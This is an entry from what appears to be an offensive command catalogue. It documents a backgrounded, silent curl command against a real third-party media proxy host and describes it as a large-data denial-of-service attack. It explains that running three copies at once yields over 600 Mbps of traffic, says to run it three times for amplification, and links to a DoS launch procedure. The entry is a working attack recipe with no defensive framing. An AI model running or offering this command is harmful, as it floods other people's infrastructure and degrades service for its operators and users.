---
id: cmd-curl-large-dos-001
data: >-
  time curl -s
  https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████████
  > /dev/null &
tags:
  - dos
  - bandwidth
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.921Z'
verified: false
validated: true
submitted: true
---
# curl-large-dos-launch

## Command

```bash
time curl -s https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████████ > /dev/null &
```

## Description

Background silent curl to proxied big.php for large data DoS, generating excessive network traffic (1GB per request, 600+ Mbps with 3 concurrent).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent | Yes |
| `> /dev/null` | Discard output | Yes |
| `&` | Background | Yes |

## Examples

### Basic Usage

Run 3 times for amplification.

## Expected Output

Completes after 1GB download, high time/bandwidth.

## Related

- [[commands/curl-postfix-large]]
- [[procedures/Launch-Slow-and-Large-DoS-via-Proxy]]
